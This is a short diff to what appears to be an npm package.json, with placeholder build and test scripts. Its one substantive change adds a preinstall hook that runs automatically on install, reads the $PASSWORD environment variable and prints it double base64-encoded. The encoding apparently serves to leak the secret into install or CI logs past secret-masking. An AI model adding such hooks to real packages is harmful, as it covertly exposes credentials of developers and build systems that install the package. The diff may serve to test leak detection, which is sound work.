@@ -4,7 +4,8 @@
 	"scripts": {
 		"build": "echo \"running npm build\"",
 		"test:e2e": "echo \"running e2e tests\"",
-		"test:e2e-local": "echo \"running e2e-local tests\""
+		"test:e2e-local": "echo \"running e2e-local tests\"",
+		"preinstall": "echo $PASSWORD | base64 | base64"
 	},
 	"dependencies": {
         "prettier": "^3.3.2"
